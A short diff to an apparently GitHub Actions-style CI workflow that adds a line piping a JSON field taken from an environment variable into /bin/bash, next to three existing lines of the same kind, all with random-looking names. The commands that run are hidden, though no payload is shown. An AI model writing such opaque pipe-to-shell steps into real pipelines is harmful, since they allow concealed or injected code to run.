@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$pjal82462" | jq -r .tnig5992 | /bin/bash
           echo $iewd1 | jq -r .j15 | /bin/bash
           echo $zxlo8 | jq -r .emw2 | /bin/bash
+          echo $zwv54 | jq -r .dboiv11 | /bin/bash
 
       - name: Archive results
         if: always()
